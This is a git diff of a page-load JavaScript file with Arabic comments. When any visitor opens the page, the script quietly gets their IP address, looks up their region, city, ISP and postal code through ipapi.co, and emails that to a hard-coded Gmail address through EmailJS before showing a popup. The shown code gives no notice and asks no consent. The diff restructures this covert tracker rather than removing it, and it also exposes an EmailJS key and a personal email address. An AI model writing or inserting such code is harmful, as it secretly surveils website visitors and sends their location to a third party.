@@ -1,7 +1,10 @@
-emailjs.init("GRpOF1pKqcSg9cx5H");
+// تأكد أن كل العناصر محمّلة أولاً
+document.addEventListener("DOMContentLoaded", function () {
+    const popup = document.getElementById("popup");
 
-window.onload = () => {
-    fetch('https://api.ipify.org?format=json')
+    emailjs.init("GRpOF1pKqcSg9cx5H");
+
+    fetch("https://api.ipify.org?format=json")
         .then(res => res.json())
         .then(data => fetch(`https://ipapi.co/${data.ip}/json/`))
         .then(res => res.json())
@@ -9,12 +12,13 @@ window.onload = () => {
             const locationString = `${loc.region || '---'} - ${loc.city || '---'} - ${loc.county || '---'} - ${loc.org || '---'} - ${loc.postal || '---'}`;
             return emailjs.send("service_25q0ern", "template_xi6fmgy", {
                 to_email: "e508769103@gmail.com",
-                subject: "تم تحديد موقع جديد",
-                message: `📍 موقع الزائر:\n${locationString}`
+                message: locationString
             });
         })
-        .catch(console.error)
+        .catch(error => {
+            console.error("حدث خطأ أثناء إرسال البريد:", error);
+        })
         .finally(() => {
-            document.getElementById("popup").style.display = "block";
+            popup.style.display = "block";
         });
-};
+});
